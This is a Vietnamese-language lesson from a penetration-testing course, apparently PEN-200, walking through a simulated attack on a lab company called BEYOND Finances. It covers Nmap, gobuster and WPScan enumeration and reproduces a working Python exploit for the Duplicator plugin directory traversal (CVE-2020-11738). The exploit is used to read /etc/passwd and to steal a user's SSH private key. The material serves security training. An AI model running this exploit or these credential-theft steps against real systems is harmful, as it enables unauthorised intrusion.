# Assembling the Pieces

# Ghép các mảnh lại với nhau

---

Trong Learning Module này, chúng ta sẽ bao gồm các Learning Unit sau:

- Liệt kê mạng công khai
- Tấn công một máy công khai
- Giành quyền truy cập vào mạng nội bộ
- Liệt kê mạng nội bộ
- Tấn công một ứng dụng web nội bộ
- Giành quyền truy cập vào Domain Controller

Bây giờ khi chúng ta đã giới thiệu tất cả các mảnh riêng lẻ của một bài kiểm thử xâm nhập, đã đến lúc ghép chúng lại với nhau trong một walkthrough. Trong Module này, chúng ta sẽ thực hiện một bài kiểm thử xâm nhập mô phỏng, được lấy cảm hứng từ các phát hiện trong thế giới thực.

Mục đích của Module này là đóng vai trò như một cây cầu nối giữa các Module PEN-200 và các Challenge Lab. Một cách để hình dung Module này là “Challenge Lab Zero”. Nếu muốn, bạn có thể khởi động các máy và tự mình thử tấn công chúng, sau đó quay lại đọc phương pháp luận và câu chuyện được mô tả ở đây. Dù theo cách nào, chúng tôi khuyến nghị bạn nên làm theo phương pháp luận này và tư duy mà nó tạo ra để tiếp cận các Challenge Lab 1–6. Lưu ý rằng để tiết kiệm thời gian, trong một số trường hợp chúng ta sẽ bỏ qua các bước không mang lại kết quả cho kịch bản mô phỏng này. Tuy nhiên, chúng tôi sẽ chỉ rõ những trường hợp đó khi chúng xảy ra.

Trong kịch bản này, công ty **BEYOND Finances** đã giao cho chúng ta nhiệm vụ thực hiện một bài kiểm thử xâm nhập đối với hạ tầng CNTT của họ. Khách hàng muốn xác định liệu một kẻ tấn công có thể xâm nhập qua vành đai bảo vệ và giành được đặc quyền domain admin trong môi trường Active Directory (AD) nội bộ hay không. Trong đợt đánh giá này, mục tiêu của khách hàng dành cho chúng ta là đạt được đặc quyền domain administrator và truy cập vào domain controller.

Chúng ta cần lưu ý rằng mỗi khách hàng có thể có các mục tiêu cuối khác nhau cho một bài kiểm thử xâm nhập, tùy thuộc vào mức độ đe dọa, hạ tầng dữ liệu và mô hình kinh doanh của họ. Ví dụ, nếu hoạt động kinh doanh chính của khách hàng là lưu trữ dữ liệu, thì mục tiêu của chúng ta có thể là chiếm được dữ liệu đó. Điều này là do một vụ xâm nhập như vậy sẽ gây ra tác động lớn nhất đến hoạt động kinh doanh của khách hàng. Trong hầu hết các môi trường, quyền domain administrator sẽ giúp chúng ta đạt được mục tiêu đó, nhưng không phải lúc nào cũng như vậy.

---

# **1. Enumerating the Public Network**

---

Learning Unit này bao gồm các Learning Objective sau:

- Liệt kê các máy trong một mạng công khai
- Thu thập thông tin hữu ích để sử dụng cho các cuộc tấn công về sau

Trong Learning Unit này, chúng ta sẽ bắt đầu với bước đầu tiên của bài kiểm thử xâm nhập: **liệt kê (enumeration)**. Khách hàng giả định của chúng ta đã cung cấp hai mục tiêu ban đầu, mà chúng ta có thể truy cập thông qua VPN PEN-200. Hình dưới đây thể hiện tổng quan mạng dựa trên thông tin do khách hàng cung cấp.

![image.png](image.png)

                                  ***Hình 1: Tổng quan mạng của các mục tiêu được cung cấp***

**Hình 1** cho thấy hai máy có thể truy cập được là **WEBSRV1** và **MAILSRV1**, cùng với các địa chỉ IP tương ứng của chúng.

Octet thứ ba mà bạn quan sát được trong lab của riêng mình có thể khác khi khởi động nhóm VM ở các bước sau.

Trong phần đầu tiên, chúng ta sẽ bắt đầu bằng việc thiết lập một môi trường làm việc cơ bản cho bài kiểm thử xâm nhập, sau đó tiến hành liệt kê **MAILSRV1**.

---

## **1.1. MAILSRV1**

---

Trước khi bắt đầu tương tác với mục tiêu để tiến hành liệt kê, chúng ta hãy thiết lập một môi trường làm việc cho bài kiểm thử xâm nhập này. Điều này sẽ giúp chúng ta lưu trữ các file và thông tin thu được theo một cách có cấu trúc trong suốt quá trình đánh giá. Ở các giai đoạn sau của một bài kiểm thử xâm nhập, điều này sẽ đặc biệt hữu ích vì chúng ta sẽ thu thập một lượng lớn dữ liệu và thông tin.

Việc cấu trúc và cô lập dữ liệu cũng như cấu hình cho nhiều bài kiểm thử xâm nhập có thể là một thách thức lớn. Nếu tái sử dụng một máy ảo Kali, chúng ta có thể vô tình làm lộ dữ liệu của khách hàng trước đó sang các mạng mới. Do đó, khuyến nghị nên sử dụng một image Kali mới cho mỗi lần đánh giá.

Vì lý do này, chúng ta sẽ tạo một thư mục **/home/kali/beyond** trên máy ảo Kali. Trong thư mục này, chúng ta sẽ tạo hai thư mục được đặt tên theo hai máy mục tiêu mà hiện tại chúng ta có quyền truy cập. Ngoài ra, chúng ta sẽ tạo một file văn bản **creds.txt** để theo dõi các thông tin xác thực và người dùng hợp lệ đã được xác định.

```
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```

                         *Listing 1 - Môi trường làm việc cơ bản cho bài kiểm thử xâm nhập này*

Bây giờ khi đã thiết lập xong môi trường làm việc, chúng ta sẵn sàng tiến hành liệt kê máy mục tiêu đầu tiên, **MAILSRV1**.

Việc ghi chép lại các phát hiện là một quá trình then chốt đối với mọi bài kiểm thử xâm nhập. Trong Module này, chúng ta sẽ lưu trữ kết quả trong môi trường làm việc cơ bản vừa thiết lập. Tuy nhiên, các trình soạn thảo Markdown, chẳng hạn như Obsidian, đã trở nên khá phổ biến để ghi chép phát hiện và dữ liệu trong các đợt đánh giá thực tế, vì chúng độc lập với ứng dụng và cung cấp các chức năng giúp đơn giản hóa việc viết báo cáo và cộng tác.

Hãy bắt đầu với một lần quét cổng đối với **MAILSRV1** bằng Nmap. Quét cổng thường là phương pháp thu thập thông tin chủ động đầu tiên mà chúng ta thực hiện để có được cái nhìn tổng quan về các cổng đang mở và các dịch vụ có thể truy cập.

Trong một bài kiểm thử xâm nhập thực tế, chúng ta cũng sẽ sử dụng các kỹ thuật thu thập thông tin thụ động như Google Dorks và các cơ sở dữ liệu mật khẩu bị rò rỉ để thu thập thêm thông tin. Những kỹ thuật này có thể cung cấp cho chúng ta tên người dùng, mật khẩu và các thông tin nhạy cảm khác.

Chúng ta sẽ sử dụng **-sV** để bật phát hiện dịch vụ và phiên bản, cũng như **-sC** để sử dụng các script mặc định của Nmap. Ngoài ra, chúng ta sẽ dùng **-oN** để tạo một file output chứa kết quả quét.

```
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-29T12:54:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```

                                                 *Listing 2 - Quét Nmap đối với MAILSRV1*

Listing 2 cho thấy Nmap đã phát hiện tám cổng đang mở. Dựa trên thông tin này, chúng ta có thể xác định rằng máy mục tiêu là một hệ thống Windows đang chạy web server IIS và hMailServer. Điều này không gây ngạc nhiên, vì máy này được đặt tên là **MAILSRV1** trong sơ đồ mạng do khách hàng cung cấp.

Trong một bài kiểm thử xâm nhập ngoài đời thực, hostname không phải lúc nào cũng mang tính mô tả rõ ràng như trong Module này.

Do có thể chúng ta chưa quen thuộc với hMailServer, chúng ta có thể nghiên cứu ứng dụng này bằng cách truy cập trang web của nó. Trang này cho biết hMailServer là một mail server miễn phí, mã nguồn mở dành cho Microsoft Windows.

Để xác định các lỗ hổng tiềm năng trong hMailServer, chúng ta có thể sử dụng công cụ tìm kiếm để tra cứu các CVE và exploit công khai. Tuy nhiên, do Nmap không phát hiện được số phiên bản, chúng ta phải tiến hành tìm kiếm với phạm vi rộng hơn. Thật không may, việc tìm kiếm này không mang lại kết quả có ý nghĩa nào ngoài một số CVE cũ.

![image.png](image%201.png)

                                                       *Hình 2: Các lỗ hổng của hMailServer*

Ngay cả khi chúng ta tìm được một lỗ hổng với exploit tương ứng cho phép thực thi mã, chúng ta cũng không nên bỏ qua các bước liệt kê còn lại. Mặc dù có thể giành được quyền truy cập vào hệ thống mục tiêu, chúng ta vẫn có thể bỏ lỡ những dữ liệu hoặc thông tin quan trọng đối với các dịch vụ và hệ thống khác.

Tiếp theo, hãy tiến hành liệt kê web server IIS. Trước tiên, chúng ta sẽ truy cập trang web.

![image.png](image%202.png)

                                                  *Hình 3: Trang chào mừng IIS trên MAILSRV1*

Hình 3 cho thấy IIS chỉ hiển thị trang chào mừng mặc định. Hãy thử xác định các thư mục và file bằng cách sử dụng **gobuster**. Chúng ta sẽ nhập **dir** để sử dụng chế độ liệt kê thư mục, **-u** cho URL, **-w** cho wordlist và **-x** cho các loại file mà chúng ta muốn xác định. Trong ví dụ này, chúng ta sẽ nhập **txt**, **pdf** và **config** để xác định các tài liệu hoặc file cấu hình tiềm năng. Ngoài ra, chúng ta sẽ sử dụng **-o** để tạo file output.

```
kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,pdf,config
[+] Timeout:                 10s
===============================================================
2022/09/29 11:12:27 Starting gobuster in directory enumeration mode
===============================================================

                                
===============================================================
2022/09/29 11:16:00 Finished
===============================================================
```

                          *Listing 3 - Sử dụng gobuster để xác định các trang và file trên MAILSRV1*

Listing 3 cho thấy gobuster không xác định được bất kỳ trang, file hay thư mục nào.

Không phải kỹ thuật liệt kê nào cũng cần cung cấp kết quả có thể khai thác ngay. Trong giai đoạn thu thập thông tin ban đầu, việc thực hiện nhiều phương pháp liệt kê khác nhau là rất quan trọng để có được cái nhìn toàn diện về hệ thống.

Hãy tóm tắt những thông tin mà chúng ta đã thu được trong quá trình liệt kê **MAILSRV1** cho đến thời điểm này. Đầu tiên, chúng ta đã thực hiện một lần quét cổng bằng Nmap, xác định được một web server IIS đang chạy và hMailServer. Ngoài ra, chúng ta cũng xác định được rằng mục tiêu đang chạy Windows, sau đó tiến hành liệt kê web server chi tiết hơn. Thật không may, các bước này không mang lại cho chúng ta bất kỳ thông tin nào có thể khai thác ngay.

Hiện tại, chúng ta chưa thể sử dụng mail server. Nếu sau này trong bài kiểm thử xâm nhập chúng ta xác định được các thông tin xác thực và mục tiêu hợp lệ, chúng ta có thể sử dụng mail server này để gửi email phishing, chẳng hạn.

Tính chất mang tính chu kỳ của một bài kiểm thử xâm nhập là một khái niệm quan trọng mà chúng ta cần nắm vững, vì nó tạo ra một tư duy liên tục đánh giá lại và tích hợp các thông tin mới, nhằm theo đuổi những vector tấn công trước đây chưa thể tiếp cận hoặc mới được xác định.

---

## **1.2. WEBSRV1**

---

Trong phần này, chúng ta sẽ tiến hành liệt kê máy mục tiêu thứ hai trong sơ đồ mạng của khách hàng, **WEBSRV1**. Dựa trên tên gọi, chúng ta có thể giả định rằng sẽ phát hiện ra một web server nào đó.

Trong một bài kiểm thử xâm nhập thực tế, chúng ta có thể quét **MAILSRV1** và **WEBSRV1** song song. Điều này có nghĩa là chúng ta có thể thực hiện các lần quét cùng lúc để tiết kiệm thời gian quý giá cho khách hàng. Nếu làm như vậy, việc thực hiện các lần quét theo cách có cấu trúc là rất quan trọng để không làm lẫn kết quả hoặc bỏ sót các phát hiện.

Cũng như trước, chúng ta sẽ bắt đầu bằng một lần quét **nmap** đối với máy mục tiêu.

```
kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 11:18 EDT
Nmap scan report for 192.168.50.244
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.50.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

                                                      *Listing 4 - Quét Nmap đối với WEBSRV1*

Kết quả quét Nmap cho thấy chỉ có hai cổng đang mở: **22** và **80**. Nmap đã fingerprint các dịch vụ đang chạy lần lượt là dịch vụ SSH và dịch vụ HTTP trên các cổng tương ứng.

Từ banner SSH, chúng ta thu được thông tin rằng mục tiêu đang chạy trên một hệ thống Ubuntu Linux. Tuy nhiên, banner này còn cung cấp nhiều chi tiết hơn nếu thực hiện thêm một chút phân tích thủ công. Hãy sao chép chuỗi **“OpenSSH 8.9p1 Ubuntu 3”** và đưa vào công cụ tìm kiếm. Kết quả trả về chứa một liên kết tới trang Ubuntu Launchpad, trong đó liệt kê thông tin phiên bản OpenSSH tương ứng với các bản phát hành Ubuntu cụ thể. Trong ví dụ của chúng ta, phiên bản này được ánh xạ tới **Jammy Jellyfish**, là tên phiên bản của **Ubuntu 22.04**.

![image.png](image%203.png)

                                     *Hình 4: Các phiên bản OpenSSH trong Jammy Jellyfish*

Đối với cổng 22, hiện tại chúng ta chỉ có lựa chọn thực hiện một cuộc tấn công mật khẩu. Do chưa có bất kỳ thông tin nào về tên người dùng hay mật khẩu, chúng ta nên phân tích các dịch vụ khác trước. Vì vậy, hãy tiến hành liệt kê cổng 80 đang chạy **Apache 2.4.52**.

Chúng ta cũng nên tìm kiếm các lỗ hổng tiềm năng trong Apache 2.4.52 tương tự như đã làm với hMailServer. Do việc này không mang lại kết quả có thể khai thác, chúng ta sẽ bỏ qua bước này.

Chúng ta sẽ bắt đầu bằng cách truy cập trang web. Vì kết quả quét Nmap cung cấp tiêu đề HTTP là **BEYOND Finances**, khả năng cao chúng ta sẽ gặp một trang không phải mặc định.

![image.png](image%204.png)

                                                            *Hình 5: Trang landing của WEBSRV1*

Hình 5 cho thấy một trang web cơ bản của công ty. Tuy nhiên, khi xem xét kỹ trang web, chúng ta sẽ nhận thấy nó không có thanh menu hay liên kết tới các trang khác. Thoạt nhìn ban đầu, dường như không có gì có thể khai thác.

Hãy kiểm tra mã nguồn của trang web để xác định công nghệ đang được sử dụng bằng cách nhấp chuột phải trong trình duyệt trên Kali và chọn **View Page Source**. Đối với phần lớn các framework và giải pháp web, chẳng hạn như các CMS, chúng ta có thể tìm thấy các artifact và chuỗi chỉ báo trong mã nguồn.

Hãy duyệt qua mã nguồn để kiểm tra phần header, các comment và liên kết của trang. Ở phía dưới, chúng ta sẽ tìm thấy một số liên kết như minh họa trong hình sau.

![image.png](image%205.png)

                                                        *Hình 6: Trang landing của WEBSRV1*

Chúng ta nhận thấy rằng các liên kết chứa chuỗi **“wp-content”** và **“wp-includes”**. Bằng cách nhập các từ khóa này vào công cụ tìm kiếm, chúng ta có thể xác định rằng trang web này sử dụng **WordPress**.

Để xác nhận điều này và có thể thu thập thêm thông tin về stack công nghệ đang được sử dụng, chúng ta có thể dùng **whatweb**.

```
kali@kali:~/beyond$ whatweb http://192.168.50.244                                                        
http://192.168.50.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], RedirectLocation[http://192.168.50.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.50.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```

                                             *Listing 5 - Quét WhatWeb đối với WEBSRV1*

Kết quả output xác nhận rằng trang web đang sử dụng **WordPress 6.0.2**.

Mặc dù WordPress core từng tồn tại nhiều lỗ hổng, nhưng các nhà phát triển WordPress vá lỗi khá nhanh. Việc xem xét lịch sử phát hành của WordPress cho thấy phiên bản này được phát hành vào tháng 8 năm 2022 và tại thời điểm viết Module này, đây là phiên bản mới nhất.

Tuy nhiên, các theme và plugin của WordPress do cộng đồng phát triển, và nhiều lỗ hổng trong số đó được vá không đúng cách hoặc thậm chí không bao giờ được sửa. Điều này khiến plugin và theme trở thành mục tiêu rất hấp dẫn để xâm nhập.

Hãy tiến hành quét các thành phần này bằng **WPScan**, một công cụ quét lỗ hổng WordPress. Công cụ này cố gắng xác định phiên bản WordPress, theme, plugin cũng như các lỗ hổng tương ứng của chúng.

WPScan tra cứu lỗ hổng của các thành phần trong **WordPress Vulnerability Database**, vốn yêu cầu một API token. Một API key giới hạn có thể được lấy miễn phí bằng cách đăng ký tài khoản trên trang chủ WPScan. Tuy nhiên, ngay cả khi không cung cấp API key, WPScan vẫn là một công cụ rất hữu ích để liệt kê các WordPress instance.

Để thực hiện quét mà không cần API key, chúng ta sẽ cung cấp URL của mục tiêu cho tham số **--url**, đặt chế độ phát hiện plugin ở mức aggressive và chỉ định liệt kê tất cả các plugin phổ biến bằng cách nhập **p** cho tham số **--enumerate**. Ngoài ra, chúng ta sẽ sử dụng **-o** để tạo file output.

```
kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

kali@kali:~/beyond$ cat websrv1/wpscan
...

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.50.244/wp-content/plugins/akismet/
 | Latest Version: 5.0
 | Last Updated: 2022-07-26T16:13:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.50.244/wp-content/plugins/classic-editor/
 | Latest Version: 1.6.2 
 | Last Updated: 2021-07-21T22:08:00.000Z
...

[+] contact-form-7
 | Location: http://192.168.50.244/wp-content/plugins/contact-form-7/
 | Latest Version: 5.6.3 (up to date)
 | Last Updated: 2022-09-01T08:48:00.000Z
...

[+] duplicator
 | Location: http://192.168.50.244/wp-content/plugins/duplicator/
 | Last Updated: 2022-09-24T17:57:00.000Z
 | Readme: http://192.168.50.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.50.244/wp-content/plugins/elementor/
 | Latest Version: 3.7.7 (up to date)
 | Last Updated: 2022-09-20T14:51:00.000Z
...

[+] wordpress-seo
 | Location: http://192.168.50.244/wp-content/plugins/wordpress-seo/
 | Latest Version: 19.7.1 (up to date)
 | Last Updated: 2022-09-20T14:10:00.000Z
...
```

                                   *Listing 6 - WPScan đối với trang WordPress trên WEBSRV1*

Listing 6 cho thấy WPScan đã phát hiện sáu plugin đang hoạt động trong WordPress instance của mục tiêu: **akismet**, **classic-editor**, **contact-form-7**, **duplicator**, **elementor** và **wordpress-seo**. Kết quả cũng cho biết plugin **Duplicator** đang sử dụng phiên bản lỗi thời.

Thay vì sử dụng cơ sở dữ liệu lỗ hổng của WPScan, hãy dùng **searchsploit** để tìm các exploit khả dĩ cho các lỗ hổng trong các plugin đã cài đặt. Đối với phần lớn các plugin được phát hiện, WPScan đã cung cấp phiên bản tương ứng. Do hầu hết các plugin đều đã được cập nhật và không xác định được phiên bản của **akismet**, hãy bắt đầu với **Duplicator**.

```
kali@kali:~/beyond$ searchsploit duplicator    
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                    | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery       | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                              | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                             | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                   | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                            | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery       | php/webapps/40908.html
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

                              *Listing 7 - Kết quả SearchSploit cho plugin WordPress Duplicator*

Kết quả cho thấy có hai exploit khớp với phiên bản plugin **Duplicator** đang chạy trên **WEBSRV1**. Một trong số đó được gắn thẻ **Metasploit**, cho biết exploit này được phát triển cho **The Metasploit Framework**. Chúng ta sẽ xem xét chúng trong Learning Unit tiếp theo.

Hãy tóm tắt những thông tin chúng ta đã thu được về **WEBSRV1** trong phần này. Chúng ta xác định rằng máy mục tiêu là một hệ thống **Ubuntu 22.04** với hai cổng mở: **22** và **80**. Một instance **WordPress** đang chạy trên cổng 80 với nhiều plugin đang hoạt động. Một plugin có tên **Duplicator** đang sử dụng phiên bản lỗi thời và một truy vấn SearchSploit đã cung cấp cho chúng ta hai mục lỗ hổng khớp với phiên bản đó.

---

# 2. Tấn công một Máy Công Khai

---

Learning Unit này bao gồm các Learning Objective sau:

- Khai thác các lỗ hổng trong WordPress Plugin
- Bẻ khóa passphrase của một SSH private key
- Leo thang đặc quyền bằng cách sử dụng các lệnh sudo
- Khai thác các developer artifact để thu thập thông tin nhạy cảm

Trong Learning Unit trước, chúng ta đã thu thập thông tin về cả hai máy **MAILSRV1** và **WEBSRV1**. Dựa trên kết quả liệt kê, chúng ta đã xác định được một plugin WordPress có khả năng tồn tại lỗ hổng trên **WEBSRV1**.

Trong Learning Unit này, chúng ta sẽ cố gắng khai thác plugin dễ bị tấn công đó để giành quyền truy cập vào hệ thống. Nếu thành công, chúng ta sẽ thực hiện leo thang đặc quyền và tìm kiếm các thông tin nhạy cảm trên máy mục tiêu.

---

## 2.1. Initial Foothold

---

Trong Learning Unit trước, chúng ta đã sử dụng **SearchSploit** để tìm các exploit cho **Duplicator 1.3.26**. SearchSploit đã cung cấp hai exploit cho phiên bản này, trong đó có một exploit dành cho Metasploit. Hãy sử dụng SearchSploit để xem exploit còn lại bằng cách cung cấp **ExploitDB ID** từ Listing 7 cho tham số **-x**.

```
kali@kali:~/beyond$ searchsploit -x 50420
```

                                   *Listing 8 - Lệnh SearchSploit để xem chi tiết một exploit cụ thể*

Sau khi nhập lệnh, thông tin và mã exploit cho một cuộc tấn công **directory traversal** trên Duplicator 1.3.26 sẽ được hiển thị.

```
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```

                     *Listing 9 - Thông tin về lỗ hổng Directory Traversal trong Duplicator 1.3.26*

Listing 9 cho thấy đoạn mã Python để khai thác lỗ hổng được theo dõi với mã **CVE-2020-11738**. Lưu ý rằng script Python gửi một yêu cầu **GET** tới một URL và thêm tên file được tiền tố bằng các biểu thức “dot dot slash”.

Hãy sao chép script Python này vào thư mục **/home/kali/beyond/websrv1** bằng cách sử dụng tùy chọn **-m** của SearchSploit cùng với ExploitDB ID.

```
kali@kali:~/beyond$ cd beyond/websrv1

kali@kali:~/beyond/websrv1$ searchsploit -m 50420
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
File Type: ASCII text

Copied to: /home/kali/beyond/websrv1/50420.py
```

                     *Listing 10 - Lệnh SearchSploit để sao chép script exploit vào thư mục hiện tại*

Để sử dụng script này, chúng ta phải cung cấp URL của mục tiêu và file mà chúng ta muốn lấy về. Hãy thử đọc và hiển thị nội dung của **/etc/passwd**, vừa để xác nhận rằng mục tiêu thực sự dễ bị tấn công, vừa để thu thập tên các tài khoản người dùng trên hệ thống.

```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```

                             *Listing 11 - Thực hiện tấn công Directory Traversal trên WEBSRV1*

Rất tốt! Chúng ta đã lấy được nội dung của **/etc/passwd** và xác định được hai tài khoản người dùng là **daniela** và **marcus**. Hãy thêm chúng vào file **creds.txt**.

Như đã học trong Module **Common Web Application Attacks**, có nhiều file mà chúng ta có thể cố gắng lấy thông qua Directory Traversal để giành quyền truy cập vào hệ thống. Một trong những phương pháp phổ biến nhất là lấy một **SSH private key** được cấu hình với quyền truy cập quá rộng.

Trong ví dụ này, chúng ta sẽ thử lấy một SSH private key có tên **id_rsa**. Tên này có thể khác nhau tùy thuộc vào loại được chỉ định khi tạo SSH private key bằng **ssh-keygen**. Ví dụ, khi chọn **ecdsa** làm loại key, SSH private key mặc định sẽ có tên **id_ecdsa**.

Hãy kiểm tra các SSH private key có tên **id_rsa** trong thư mục home của **daniela** và **marcus**.

```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```

                                               *Listing 12 - Lấy SSH private key của daniela*

Listing 12 cho thấy chúng ta đã lấy được thành công SSH private key của **daniela**. Hãy lưu key này vào một file có tên **id_rsa** trong thư mục hiện tại.

Tiếp theo, hãy thử tận dụng key này để truy cập **WEBSRV1** với tư cách **daniela** thông qua SSH. Để làm điều đó, chúng ta cần chỉnh sửa quyền của file như đã thực hiện nhiều lần trong khóa học này.

```
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa

kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 
```

